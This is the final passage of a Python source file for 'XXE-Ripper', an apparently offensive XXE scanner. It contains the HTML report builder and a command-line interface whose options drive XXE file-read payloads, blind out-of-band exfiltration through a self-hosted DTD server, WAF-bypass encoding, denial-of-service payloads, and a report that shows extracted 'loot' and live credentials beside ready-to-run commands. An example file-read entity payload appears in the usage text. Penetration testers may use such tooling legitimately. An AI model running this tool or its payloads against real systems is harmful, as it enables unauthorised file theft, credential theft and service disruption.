.target{margin-top:28px}
.target-url{font-family:"JetBrains Mono",monospace;font-size:13px;
  color:var(--accent);margin:0 0 12px;padding-bottom:8px;
  border-bottom:1px solid var(--line);font-weight:500;
  word-break:break-all}
.findings-table{width:100%;border-collapse:collapse}
.findings-table th{text-align:left;font-weight:500;font-size:10px;
  letter-spacing:.06em;text-transform:uppercase;color:var(--fg3);
  padding:8px 10px;border-bottom:1px solid var(--line)}
.findings-table td{padding:12px 10px;vertical-align:top;
  border-bottom:1px solid var(--line);font-size:12.5px}
.findings-table .num{text-align:right;
  font-family:"JetBrains Mono",monospace;color:var(--fg3)}
.sev{font-family:"JetBrains Mono",monospace;font-size:10px;
  font-weight:600;text-transform:uppercase;letter-spacing:.05em;
  padding:2px 7px;border-radius:3px;white-space:nowrap}
.sev.CRITICAL{color:var(--crit);background:rgba(244,113,116,.1)}
.sev.HIGH{color:var(--high);background:rgba(251,146,60,.1)}
.sev.MEDIUM{color:var(--med);background:rgba(251,191,36,.1)}
.sev.LOW{color:var(--fg2);background:var(--bg3)}
.sev.INFO{color:var(--fg3);background:var(--bg3)}
.ftitle{font-weight:500;margin-bottom:3px}
.fdesc{font-size:11.5px;line-height:1.55;margin-bottom:8px;
  color:var(--fg2)}
.cwe{font-family:"JetBrains Mono",monospace;font-size:10.5px;
  color:var(--violet);margin-bottom:6px}
.reasons{margin:6px 0 0 0;padding-left:18px;font-size:11.5px;
  color:var(--fg2)}
.reasons li{margin-bottom:3px}
.ev{display:grid;grid-template-columns:max-content 1fr;
  gap:3px 14px;font-family:"JetBrains Mono",monospace;
  font-size:10.5px;margin-top:10px;padding:10px 12px;
  background:var(--bg);border-radius:4px;
  border:1px solid var(--line)}
.ev-k{color:var(--fg3)}
.ev-v{color:var(--fg2);word-break:break-all}
.copy{background:transparent;border:1px solid var(--line);
  color:var(--fg3);font:inherit;font-size:10px;padding:3px 9px;
  border-radius:4px;cursor:pointer;margin-left:6px;
  text-transform:uppercase;letter-spacing:.05em;
  font-family:"JetBrains Mono",monospace}
.copy:hover{color:var(--fg);border-color:var(--fg3)}
.copy.copied{color:var(--ok);border-color:var(--ok)}
.rpt-foot{padding:28px 32px;text-align:center;color:var(--fg3);
  font-size:11.5px}
@media print {
  body{background:#fff;color:#111}
  .rpt-head{background:#f6f6f8;border-bottom-color:#d0d0d6}
  .rpt-section{border-bottom-color:#e0e0e6}
  .cred,.chain,.loot-item{background:#fafafc;border-color:#e0e0e6}
  .copy{display:none}
  pre,.snippet pre,.step-ev,.loot-pre{background:#f2f2f5;
    border-color:#e0e0e6;color:#222}
  .chain-flow{background:#eef2f8;color:#2b4a7a}
  a{color:#1a4488}
  .sev.CRITICAL{color:#b32226;background:#fbe9ea}
  .sev.HIGH{color:#a84a12;background:#fbeddf}
  .sev.MEDIUM{color:#8a6410;background:#fbf3dc}
  .tcell{background:#f2f2f5}
}
"""

    js = """
document.addEventListener('click', function(e){
  var b = e.target.closest('.copy');
  if (!b) return;
  var t = atob(b.dataset.c);
  var done = function(){
    b.classList.add('copied');
    var old = b.textContent;
    b.textContent = 'copied';
    setTimeout(function(){
      b.classList.remove('copied');
      b.textContent = old;
    }, 1200);
  };
  if (navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(t).then(done, done);
  } else {
    var ta = document.createElement('textarea');
    ta.value = t; ta.style.position='fixed'; ta.style.opacity=0;
    document.body.appendChild(ta); ta.select();
    try { document.execCommand('copy'); } catch(_){}
    document.body.removeChild(ta); done();
  }
});
"""

    out: List[str] = []
    out.append('<!doctype html><html lang="en"><head>')
    out.append('<meta charset="utf-8">')
    out.append('<meta name="viewport" content="width=device-width,'
               'initial-scale=1">')
    out.append(f'<title>XXE-Ripper Report — {_html_esc(generated)}</title>')
    out.append(f'<style>{css}</style></head><body>')

    out.append(f"""
<header class="rpt-head">
  <div class="rpt-brand">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <path d="M12 2 3 6v6c0 5 3.5 9.5 9 10 5.5-.5 9-5 9-10V6l-9-4z"/>
      <path d="m9 12 2 2 4-4"/>
    </svg>
    <div>
      <div class="rpt-title">XXE-Ripper Report</div>
      <div class="rpt-sub">{_html_esc(generated)} ·
        {n_targets} target(s)</div>
    </div>
  </div>
  <div class="rpt-totals">
    <div class="tcell crit"><div class="tn">{totals["CRITICAL"]}</div>
      <div class="tl">Critical</div></div>
    <div class="tcell high"><div class="tn">{totals["HIGH"]}</div>
      <div class="tl">High</div></div>
    <div class="tcell med"><div class="tn">{totals["MEDIUM"]}</div>
      <div class="tl">Medium</div></div>
    <div class="tcell"><div class="tn">{totals["LOW"]}</div>
      <div class="tl">Low</div></div>
  </div>
</header>
""")

    out.append(f"""
<section class="rpt-section">
  <h2>Executive summary</h2>
  <div class="summary-grid">
    <div><span class="sgl">Targets scanned</span>
      <span class="sgv">{n_targets}</span></div>
    <div><span class="sgl">Vulnerable targets</span>
      <span class="sgv">{n_vuln}</span></div>
    <div><span class="sgl">Highest severity</span>
      <span class="sgv sev-{worst}">{worst}</span></div>
    <div><span class="sgl">Confirmed findings</span>
      <span class="sgv">{totals["confirmed"]}</span></div>
    <div><span class="sgl">Loot recovered</span>
      <span class="sgv">{len(all_loot)}</span></div>
  </div>
</section>
""")

    # Chains
    if chains:
        out.append('<section class="rpt-section">')
        out.append(f'<h2>Exploit chains <span class="badge">'
                   f'{len(chains)}</span></h2>')
        for r, f in chains:
            steps = (f.get("evidence") or {}).get("steps", [])
            flow = " → ".join(
                _html_esc(s.get("stage", "?")) for s in steps)
            step_items = "".join(
                f'<li><span class="step-name">'
                f'{_html_esc(s.get("stage", ""))}</span>'
                f'<div class="step-ev">'
                f'{_html_esc(json.dumps(s.get("evidence", {}), indent=2))}'
                f'</div></li>'
                for s in steps
            )
            out.append(f"""
<article class="chain">
  <div class="chain-title">{_html_esc(f.get('title', ''))}</div>
  <div class="dim mono" style="font-size:11px;margin-bottom:8px">
    {_html_esc(r.get('url', ''))}
  </div>
  <div class="chain-flow">{flow}</div>
  <ol class="chain-steps">{step_items}</ol>
</article>
""")
        out.append('</section>')

    if all_loot:
        out.append('<section class="rpt-section">')
        out.append(f'<h2>Extracted loot <span class="badge">'
                   f'{len(all_loot)}</span></h2>')
        out.append('<p class="dim" style="margin-bottom:6px">Files, '
                   'credentials, and other content recovered from '
                   'targets. Copy buttons deliver the full content '
                   'or the ready-to-run command.</p>')

        files = [e for e in all_loot if e.get("kind") == "file"]
        secrets = [e for e in all_loot if e.get("kind") != "file"]

        for entry in files:
            path = entry.get("source_path", "")
            tech = entry.get("technique", "")
            content = entry.get("content", "") or ""
            creds = entry.get("credentials") or []
            out.append(f"""
<article class="loot-item">
  <div class="loot-head">
    <span class="loot-kind loot-kind-file">file</span>
    <span class="loot-path">{_html_esc(path)}</span>
    <span class="loot-size">{entry.get('size', 0)}B</span>
    {_html_copy_btn(content, "copy all")}
  </div>
  <div class="dim mono" style="font-size:10.5px;margin-bottom:8px">
    {_html_esc(tech)} · {_html_esc(entry.get('source_url', ''))}
  </div>
  <pre class="loot-pre">{_html_esc(content)}</pre>
  {"".join(f'''
  <div style="margin-top:12px">
    <div style="font-family:var(--mono);font-size:10.5px;
      text-transform:uppercase;letter-spacing:.06em;color:var(--crit);
      margin-bottom:8px">{_html_esc(c.get("kind","secret"))} recovered
    </div>
    <table class="kv">
      {"".join(f'<tr><th>{_html_esc(k)}</th><td>{_html_esc(v)}'
               f'{_html_copy_btn(v)}</td></tr>'
               for k, v in (c.get("fields") or {}).items())}
    </table>
    {"".join(f'''
    <div class="snippet">
      <div class="snip-head">
        <span>{_html_esc(s.get("label", "command"))}</span>
        {_html_copy_btn(s.get("shell", ""), "copy")}
      </div>
      <pre>{_html_esc(s.get("shell", ""))}</pre>
    </div>''' for s in (c.get("snippets") or []))}
  </div>''' for c in creds)}
</article>""")

        for entry in secrets:
            raw = entry.get("content", "") or ""
            out.append(f"""
<article class="loot-item">
  <div class="loot-head">
    <span class="loot-kind loot-kind-{_html_esc(entry.get('kind',''))}">
      {_html_esc(entry.get('kind','secret'))}</span>
    <span class="loot-path">{_html_esc(entry.get('source_path',''))}</span>
    {_html_copy_btn(raw, "copy")}
  </div>
  <pre class="loot-pre">{_html_esc(raw)}</pre>
</article>""")

        out.append('</section>')

    # Per-target findings
    out.append('<section class="rpt-section">')
    out.append('<h2>Findings by target</h2>')
    for r in results:
        url = r.get("url", "")
        findings = r.get("findings", []) or []
        if not findings:
            continue
        rows = []
        for f in findings:
            cwe = ", ".join(f.get("cwe", []))
            reasons = f.get("reasons") or []
            ev = f.get("evidence") or {}
            ev_rows = "".join(
                f'<span class="ev-k">{_html_esc(k)}</span>'
                f'<span class="ev-v">'
                f'{_html_esc(json.dumps(v) if isinstance(v, (dict, list)) else v)[:300]}'
                f'</span>'
                for k, v in ev.items()
                if k not in ("extracted_credentials", "steps",
                             "score", "extracted_content_preview")
            )
            rows.append(f"""
<tr>
  <td><span class="sev {_html_esc(f.get('severity','INFO'))}">
    {_html_esc(f.get('severity','INFO'))}</span></td>
  <td class="mono">{_html_esc(f.get('id',''))}</td>
  <td>
    <div class="ftitle">{_html_esc(f.get('title',''))}</div>
    <div class="fdesc">{_html_esc(f.get('description',''))}</div>
    {f'<div class="cwe">CWE: {_html_esc(cwe)}</div>' if cwe else ''}
    {f'<ul class="reasons">{"".join(f"<li>{_html_esc(x)}</li>" for x in reasons)}</ul>' if reasons else ''}
    {f'<div class="ev">{ev_rows}</div>' if ev_rows else ''}
  </td>
  <td class="num">{f.get('confidence', 0)}</td>
</tr>""")
        out.append(f"""
<div class="target">
  <h3 class="target-url">{_html_esc(url)}</h3>
  <table class="findings-table">
    <thead><tr>
      <th style="width:90px">Severity</th>
      <th style="width:240px">ID</th>
      <th>Details</th>
      <th style="width:60px;text-align:right">Conf</th>
    </tr></thead>
    <tbody>{''.join(rows)}</tbody>
  </table>
</div>
""")
    out.append('</section>')

    out.append(f"""
<footer class="rpt-foot">
  <p>Generated by <strong>XXE-Ripper</strong> ·
     {_html_esc(generated)}</p>
  <p class="dim">Authorized testing only. Extraction includes live
     credentials — treat this file as a secret.</p>
</footer>
<script>{js}</script>
</body></html>""")

    return "".join(out)

def main():
    global DEBUG
    parser = argparse.ArgumentParser(
        description="XXE-Ripper — Advanced XXE Scanner with manual OOB confirmation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # OOB: run interactsh-client separately, pass the session domain
  #   terminal A:  interactsh-client -v
  #   terminal B:  python3 xxeripper.py https://target.com/api/xml \\
  #                    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro --timing

  # Authenticated scan with Burp request
  python3 xxeripper.py -r request.txt \\
      --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro

  # Custom payloads
  python3 xxeripper.py https://target.com/api/xml \\
      --payload '<!DOCTYPE x [<!ENTITY e SYSTEM "file://{FILE}">]><x>&e;</x>'

  # Full combo with rate limiting
  python3 xxeripper.py -r request.txt \\
      --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro --timing \\
      --cookie "extra=token" --payload-dir ./payloads/ \\
      --rate 5 --timeout-read 20 -o results.json
        """,
    )

    parser.add_argument(
        "url",
        nargs="?",
        metavar="URL",
        help="Target URL to scan."
    )

    parser.add_argument(
        "-u", "--urls",
        metavar="FILE",
        help="Read target URLs from a file."
    )

    parser.add_argument(
        "-o", "--output",
        metavar="FILE",
        help="Write scan results to the specified file."
    )

    parser.add_argument(
        "--format",
        choices=("json", "sarif", "both"),
        default="json",
        help="Output format for --output (default: json). "
            "'both' produces separate JSON and SARIF files."
    )

    parser.add_argument(
        "--report-html",
        metavar="PATH",
        default=None,
        help="Write a self-contained HTML report to PATH."
    )

    parser.add_argument(
        "--fail-on",
        choices=("critical", "high", "medium", "low", "never"),
        default="never",
        help="Exit with status 2 when a finding at or above the specified "
            "severity is detected (default: never)."
    )

    parser.add_argument(
        "-r", "--request",
        metavar="FILE",
        help="Scan a Burp Suite-format request file."
    )

    oob_group = parser.add_mutually_exclusive_group()

    oob_group.add_argument(
        "--oob-domain",
        required=False,
        default=None,
        metavar="DOMAIN",
        help="Use a manually managed Interactsh session domain for "
            "out-of-band testing. Payloads are generated under this "
            "domain; callbacks must be monitored separately."
    )

    oob_group.add_argument(
        "--oob-auto",
        action="store_true",
        help="Automatically start interactsh-client and correlate "
            "out-of-band callbacks during the scan. Requires "
            "interactsh-client in PATH."
    )

    parser.add_argument(
        "--oob-timeout",
        type=float,
        default=None,
        metavar="SECONDS",
        help="Wait up to SECONDS for an out-of-band callback after each "
            "payload. Valid only with --oob-auto (default: 8 seconds)."
    )

    parser.add_argument(
        "--proxy",
        metavar="URL",
        default=None,
        help="Route HTTP(S) traffic through the specified proxy."
    )

    parser.add_argument(
        "--cookie",
        metavar="COOKIES",
        default=None,
        help="Specify inline HTTP cookies for authenticated scanning."
    )

    parser.add_argument(
        "--cookie-file",
        metavar="FILE",
        default=None,
        help="Read HTTP cookies from a file."
    )

    parser.add_argument(
        "--no-cookie-merge",
        action="store_true",
        help="Disable automatic merging of cookies from multiple sources."
    )

    parser.add_argument(
        "--pre-auth-request",
        action="append",
        default=[],
        metavar="FILE",
        help="Replay a Burp Suite-format request before scanning and "
            "merge Set-Cookie headers into the scanner session. "
            "Specify multiple times for multi-step authentication."
    )

    exfil_group = parser.add_argument_group(
        "Blind exfiltration",
        "Recover file contents through out-of-band callbacks. "
        "Requires a target-reachable DTD endpoint provided by either "
        "the built-in server or an externally hosted directory."
    )

    exfil_group.add_argument(
        "--oob-listen",
        metavar="HOST:PORT",
        default=None,
        help="Start the built-in DTD HTTP server on HOST:PORT. "
            "Requires --oob-public-url."
    )

    exfil_group.add_argument(
        "--oob-public-url",
        metavar="URL",
        default=None,
        help="Public URL prefix for the built-in DTD server. "
            "The scanner appends a unique token and '.dtd' to the URL."
    )

    exfil_group.add_argument(
        "--oob-dtd-dir",
        metavar="PATH",
        default=None,
        help="Write generated DTD files to PATH for serving by an "
            "external HTTP server."
    )

    exfil_group.add_argument(
        "--oob-dtd-url-prefix",
        metavar="URL",
        default=None,
        help="Public URL prefix corresponding to --oob-dtd-dir."
    )

    parser.add_argument(
        "--payload",
        action="append",
        default=[],
        metavar="PAYLOAD",
        help="Add a custom payload. May be specified multiple times."
    )

    parser.add_argument(
        "--payload-file",
        action="append",
        default=[],
        metavar="FILE",
        help="Load custom payloads from a file. May be specified multiple times."
    )

    parser.add_argument(
        "--payload-dir",
        metavar="PATH",
        default=None,
        help="Load custom payload definitions from a directory."
    )

    parser.add_argument(
        "--timing",
        action="store_true",
        help="Enable timing-based blind vulnerability detection."
    )

    parser.add_argument(
        "--unsafe",
        action="store_true",
        help="Enable potentially disruptive denial-of-service payloads."
    )

    parser.add_argument(
        "--svg",
        action="store_true",
        help="Force execution of the SVG upload test phase."
    )

    parser.add_argument(
        "--saml",
        action="store_true",
        help="Force SAML testing on endpoints that cannot be identified "
            "as SAML-related from their URL."
    )

    parser.add_argument(
        "--bypass-waf",
        nargs="?",
        const="all",
        default=None,
        metavar="ENCODERS",
        help="Run payloads through WAF-bypass encoders before the standard "
            "test phases. Use 'all' or omit the value to enable all "
            "encoders, or provide a comma-separated encoder list."
    )

    parser.add_argument(
        "--bypass-waf-include-custom",
        action="store_true",
        help="Include user-supplied custom payloads in WAF-bypass testing. "
            "Payloads containing {CALLBACK} or {DOMAIN} are excluded."
    )

    parser.add_argument(
        "--full-file-scan",
        action="store_true",
        help="Use the complete Linux and Windows file-target set instead "
            "of the default priority subset. Provides broader file-read "
            "coverage at the cost of additional requests."
    )

    parser.add_argument(
        "--no-fingerprint",
        action="store_true",
        help="Disable parser fingerprinting and capability-based test "
            "gating. All scan phases are executed unconditionally."
    )

    parser.add_argument(
        "--no-fingerprint-cache",
        action="store_true",
        help="Disable the persistent fingerprint cache and perform a fresh "
            "fingerprint probe for every scan."
    )

    parser.add_argument(
        "--rate",
        type=float,
        default=0.0,
        metavar="REQUESTS",
        help="Maximum requests per second per target. Use 0 for unlimited "
            "rate (default: 0)."
    )

    parser.add_argument(
        "--timeout-connect",
        type=float,
        default=5.0,
        metavar="SECONDS",
        help="Connection timeout in seconds (default: 5)."
    )

    parser.add_argument(
        "--timeout-read",
        type=float,
        default=15.0,
        metavar="SECONDS",
        help="Read timeout in seconds (default: 15)."
    )

    parser.add_argument(
        "--budget",
        type=float,
        default=3600.0,
        metavar="SECONDS",
        help="Maximum wall-clock time allowed for the scan "
            "(default: 3600 seconds)."
    )

    parser.add_argument(
        "--verify-tls",
        action="store_true",
        help="Verify TLS certificates. Disabled by default."
    )

    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable debug logging."
    )

    parser.add_argument(
        "--threads",
        type=int,
        default=MAX_THREADS,
        metavar="N",
        help="Maximum number of concurrent worker threads."
    )

    parser.add_argument(
        "--serve",
        action="store_true",
        help="Start the web console instead of running a CLI scan."
    )

    parser.add_argument(
        "--host",
        metavar="ADDRESS",
        default="127.0.0.1",
        help="Address on which the web console listens "
            "(default: 127.0.0.1)."
    )

    parser.add_argument(
        "--port",
        type=int,
        metavar="PORT",
        default=8080,
        help="Port on which the web console listens (default: 8080)."
    )

    args = parser.parse_args()
    DEBUG = args.debug


    if args.serve:
        run_webui_server(args.host, args.port)
        return

    if args.oob_domain and args.oob_timeout is not None:
        parser.error(
            "--oob-timeout has no effect with --oob-domain (manual mode "
            "never waits for callbacks). Use --oob-auto, or drop "
            "--oob-timeout.")
    if args.oob_timeout is None:
        args.oob_timeout = 8.0

    try:
        bypass_waf_encoders = parse_bypass_spec(args.bypass_waf)
    except ValueError as e:
        parser.error(str(e))

    custom_payloads = CustomPayloadLoader()

    for p in args.payload:
        custom_payloads.add_inline(p)
    for pf in args.payload_file:
        custom_payloads.add_file(pf)
    if args.payload_dir:
        custom_payloads.add_dir(args.payload_dir)

    urls = []
    base_request = None
    if args.request:
        try:
            base_request = parse_burp_request(args.request)
        except (ValueError, OSError) as e:
            warn(f"failed to parse request file: {e}")
            sys.exit(1)
        urls = [base_request["url"]]

    pre_auth_requests: List[Dict] = []
    for pa_path in args.pre_auth_request:
        try:
            pre_auth_requests.append(parse_burp_request(pa_path))
        except (ValueError, OSError) as e:
            warn(f"failed to parse --pre-auth-request {pa_path}: {e}")
            sys.exit(1)
    if pre_auth_requests:
        print(f"[*] {len(pre_auth_requests)} pre-auth request(s) queued")
    else:
        if args.url:
            urls.extend(normalize_urls(args.url))
        if args.urls:
            urls.extend(load_urls(args.urls))

    if not urls:
        parser.print_help()
        sys.exit(1)

    timeout = (args.timeout_connect, args.timeout_read)
    ctx = ScanContext(deadline=time.time() + args.budget)

    workers = min(len(urls), args.threads)
    print(f"[*] XXE-Ripper scanning {len(urls)} target(s)")
    if args.oob_domain:
        print(f"[*] OOB payloads under {args.oob_domain}")
        print(f"[*]   Manual verification: watch your interactsh-client "
              f"terminal and match the [OOB] lines below")
        print(f"[*]   Manual mode does not extract OOB exfil — blind file "
              f"content must be read from the interactsh terminal. Use "
              f"--oob-auto to enable automatic extraction.")
    if custom_payloads:
        print(f"[*] {len(custom_payloads)} custom payload(s) loaded")
    if args.timing:
        print(f"[*] Timing-based blind detection enabled")
    if args.no_fingerprint:
        print(f"[*] Fingerprint phase disabled — capability gating off, "
              f"all phases will run")
    if args.no_fingerprint_cache:
        print(f"[*] Fingerprint cache disabled — every scan re-probes")
    if args.full_file_scan:
        print(f"[*] Full file-target scan enabled — ~50 file probes per target")
    if args.saml:
        print(f"[*] SAML pre-signature phase forced — will run on "
              f"non-SAML-shaped URLs too")
    if bypass_waf_encoders:
        print(f"[*] WAF bypass enabled — encoders: "
              f"{', '.join(bypass_waf_encoders)}")
        print(f"[*]   Every catalogue payload re-sent encoded. "
              f"~{len(bypass_waf_encoders)}× normal request volume.")
        if args.bypass_waf_include_custom:
            print(f"[*]   Custom payloads also being encoded")
        if not args.oob_domain and not args.oob_auto:
            print(f"[*]   No OOB channel — encoded OOB payloads skipped")
    if args.rate > 0:
        print(f"[*] Rate limit: {args.rate} req/s per target "
              f"({len(urls)} target(s))")
    print(f"[*] Budget: {args.budget}s, timeouts: connect={timeout[0]}s "
          f"read={timeout[1]}s")
    print()

    oob_manager: Optional[InteractshManager] = None
    if args.oob_auto:
        print(f"[*] Starting interactsh-client (--oob-auto)...")
        oob_manager = InteractshManager()
        try:
            domain = oob_manager.start()
        except RuntimeError as e:
            warn(f"failed to start interactsh-client: {e}")
            sys.exit(1)
        print(f"[*] Session domain: {domain}")
        print(f"[*] Callbacks will be correlated automatically.")
        print()

    dtd_provider: Optional[Any] = None
    if args.oob_listen:
        if not args.oob_public_url:
            warn("--oob-listen requires --oob-public-url "
                 "(the address the target will use to fetch DTDs)")
            sys.exit(1)
        try:
            host, port_s = args.oob_listen.rsplit(":", 1)
            port = int(port_s)
        except (ValueError, AttributeError):
            warn(f"--oob-listen must be HOST:PORT; got "
                 f"{args.oob_listen!r}")
            sys.exit(1)
        dtd_provider = DTDServer(host, port, args.oob_public_url)
        try:
            dtd_provider.start()
        except OSError as e:
            warn(f"failed to bind DTD server on "
                 f"{args.oob_listen}: {e}")
            sys.exit(1)
        print(f"[*] DTD server bound on {args.oob_listen}")
        print(f"[*]   Public URL: {args.oob_public_url}")
        print(f"[*]   Blind exfiltration is ENABLED")
        print()
    elif args.oob_dtd_dir:
        if not args.oob_dtd_url_prefix:
            warn("--oob-dtd-dir requires --oob-dtd-url-prefix")
            sys.exit(1)
        try:
            dtd_provider = FileDTDWriter(
                args.oob_dtd_dir, args.oob_dtd_url_prefix)
        except Exception as e:
            warn(f"failed to prepare DTD directory "
                 f"{args.oob_dtd_dir}: {e}")
            sys.exit(1)
        print(f"[*] DTD writer: {args.oob_dtd_dir} "
              f"-> {args.oob_dtd_url_prefix}")
        print(f"[*]   Blind exfiltration is ENABLED — make sure your "
              f"web server serves that directory")
        print()
    elif args.oob_public_url or args.oob_dtd_url_prefix:
        warn("DTD URL options supplied without --oob-listen or "
             "--oob-dtd-dir; ignoring — blind exfiltration disabled")

    results = []
    vulnerable = 0
    done_count = 0
    progress_lock = threading.Lock()

    try:
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {
                executor.submit(
                    scan_target, u, args.oob_domain,
                    base_request, custom_payloads, args.cookie,
                    args.cookie_file, not args.no_cookie_merge,
                    args.unsafe, args.proxy, args.oob_timeout,
                    args.timing, args.rate, ctx, timeout,
                    args.verify_tls, args.svg, args.no_fingerprint,
                    args.no_fingerprint_cache, args.full_file_scan,
                    saml_mode=args.saml,
                    bypass_waf_encoders=bypass_waf_encoders,
                    bypass_waf_include_custom=(
                        args.bypass_waf_include_custom
                    ),
                    pre_auth_requests=pre_auth_requests,
                    oob_manager=oob_manager,
                    dtd_provider=dtd_provider,
                ): u
                for u in urls
            }
            for future in as_completed(futures):
                target = futures[future]
                with progress_lock:
                    done_count += 1
                    progress = f"[{done_count}/{len(urls)}]"
                try:
                    result = future.result()
                except Exception as e:
                    warn(f"Scan error on {target}: {e}")
                    continue
                if result:
                    non_info = [f for f in result["findings"]
                                if f["severity"] in
                                {"CRITICAL", "HIGH", "MEDIUM"}]
                    oob_sent = result.get("oob_payloads_sent", 0)

                    if non_info:
                        vulnerable += 1
                        print(f"\n{progress} [VULNERABLE] {result['url']}")
                    elif oob_sent > 0:
                        print(f"\n{progress} [MANUAL-OOB] {result['url']}")
                    else:
                        print(f"\n{progress} [INFO-ONLY] {result['url']}")

                    if result.get("parser_fingerprint") != "unknown":
                        print(f"  Parser: {result['parser_fingerprint']}")

                    _print_skips(result.get("skipped_phases", []))

                    _print_oob(result)

                    summary = {}
                    for f in result["findings"]:
                        fid = f["id"]
                        s = summary.setdefault(fid, {
                            "severity": f["severity"],
                            "title": f["title"],
                            "score": f.get("confidence", 0),
                            "count": 0,
                        })
                        s["count"] += 1
                        s["score"] = max(s["score"], f.get("confidence", 0))
                    for fid, s in summary.items():
                        suffix = f" ({s['count']} variants)" if s["count"] > 1 else ""
                        score_tag = f" score={s['score']}" if s["score"] else ""

                        sample = next(
                            (f for f in result["findings"] if f["id"] == fid),
                            None,
                        )
                        cwe_list = (sample or {}).get("cwe", [])
                        cwe_desc = (sample or {}).get("cwe_descriptions", []) \
                                or [CWE_DESCRIPTIONS.get(c, c) for c in cwe_list]
                        cwe_tag = f" [{','.join(cwe_list)}]" if cwe_list else ""

                        print(f"  [{s['severity']}]{cwe_tag}{score_tag} "
                            f"{s['title']}{suffix}")

                        for cid, cdesc in zip(cwe_list, cwe_desc):
                            print(f"      CWE: {cid} — {cdesc}")

                        for f in result["findings"]:
                            if f["id"] == fid:
                                for r in f.get("reasons", []):
                                    print(f"      ↳ {r}")
                    results.append(result)
                else:
                    print(f"{progress} [OK] {target} — no XXE detected")

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(130)
    finally:
        if oob_manager is not None:
            oob_manager.stop()
            print("[*] interactsh-client stopped.")
        if dtd_provider is not None:
            try:
                dtd_provider.stop()
            except Exception:
                pass
            print("[*] DTD server stopped.")

    oob_targets = sum(1 for r in results
                      if r.get("oob_payloads_sent", 0) > 0
                      and not any(f["severity"] in
                                  {"CRITICAL", "HIGH", "MEDIUM"}
                                  for f in r["findings"]))
    print(f"\n[*] {vulnerable} vulnerable / {len(urls)} total")

    targets_with_skips = sum(1 for r in results
                             if r.get("skipped_phases"))
    if targets_with_skips:
        print(f"[!] {targets_with_skips} of {len(urls)} target(s) had "
              f"skipped phases — this scan was INCOMPLETE.")
        print(f"[*] See the per-target lists above for which phases "
              f"were skipped and why.")

    if oob_targets:
        print(f"[*] {oob_targets} target(s) sent OOB payloads without "
              f"auto-confirmation.")
        print(f"[*] Check your interactsh-client terminal before "
              f"concluding — a callback proves blind XXE.")

    _INTERNAL_KEYS = ("skipped_phases",)

    def _public(r: Dict) -> Dict:
        return {k: v for k, v in r.items() if k not in _INTERNAL_KEYS}

    json_payload = {
        "schema_version": "1.1",
        "tool": "XXE-Ripper",
        "summary": {
            "targets": len(urls),
            "vulnerable_targets": vulnerable,
            "custom_payloads_loaded": len(custom_payloads),
        },
        "results": [_public(r) for r in results],
    }

    if args.output:
        out_path = Path(args.output)
        written: List[str] = []

        if args.format in ("json", "both"):
            json_path = out_path if args.format == "json" \
                        else out_path.with_suffix(".json")
            with open(json_path, "w") as f:
                json.dump(json_payload, f, indent=4)
            written.append(str(json_path))

        if args.format in ("sarif", "both"):
            sarif_path = out_path.with_suffix(".sarif")
            sarif = build_sarif(results)
            with open(sarif_path, "w") as f:
                json.dump(sarif, f, indent=4)
            written.append(str(sarif_path))

        for p in written:
            print(f"[*] Results written to {p}")

    if args.report_html:
        html = build_html_report(
            results,
            meta={"invocation": " ".join(sys.argv),
                  "targets": len(urls)},
        )
        Path(args.report_html).write_text(html, encoding="utf-8")
        print(f"[*] HTML report: {args.report_html}")

    fail_on = args.fail_on
    if fail_on != "never":
        order = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
        threshold = order[fail_on.upper()]
        hit = any(
            order.get(f["severity"], 0) >= threshold
            for r in results
            for f in r.get("findings", [])
        )
        if hit:
            print(f"[*] Findings at or above '{fail_on}' present — "
                  f"exiting with code 2")
            sys.exit(2)


if __name__ == "__main__":
    main()